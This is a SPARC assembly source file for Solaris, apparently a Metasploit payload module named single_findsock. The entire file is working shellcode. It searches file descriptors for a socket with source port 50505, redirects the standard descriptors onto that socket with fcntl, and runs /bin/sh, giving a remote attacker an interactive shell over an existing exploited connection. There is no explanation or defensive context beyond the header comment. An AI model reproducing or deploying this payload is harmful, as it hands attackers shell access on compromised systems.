##
#
#        Name: single_findsock
#   Platforms: Solaris
#     Authors: vlad902 <vlad902 [at] gmail.com>
#     Version: $Revision: 1991 $
#     License:
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        Search file descriptors based on source port.
#
##

.globl main

main:
# l6 is set here with the port
	set	50505, %l6
	andn	%sp, 7, %sp

	xor	%o2, %o2, %o0
	st	%o0, [ %sp - 0x18 ]

getpeername_loop:
	add	%o0, 1, %o0
	and	%o0, 4095, %o0

	mov	0x10, %o1
	std	%o0, [ %sp - 0x08 ]

	sub	%sp, 0x04, %o2
	sub	%sp, 0x18, %o1
	mov	243, %g1
	ta	0x08

	mov	3, %o2
	lduh	[ %sp - 0x16 ], %l5
	xorcc	%l5, %l6, %i5
	bnz	getpeername_loop
fcntl_loop:
	ld	[ %sp - 0x08 ], %o0

	mov	9, %o1
	subcc	%o2, 1, %o2
	mov	0x3e, %g1
	ta	0x08

	bnz	fcntl_loop

	xor	%o3, %o3, %o3
	set	0x2f62696e, %l0
	set	0x2f736800, %l1
	sub	%sp, 0x10, %o0
	sub	%sp, 0x08, %o1
	std	%l0, [ %sp - 0x10 ]
	st	%o0, [ %sp - 0x08 ]
	st	%g0, [ %sp - 0x04 ]
	mov	0x3b, %g1
	ta	0x08
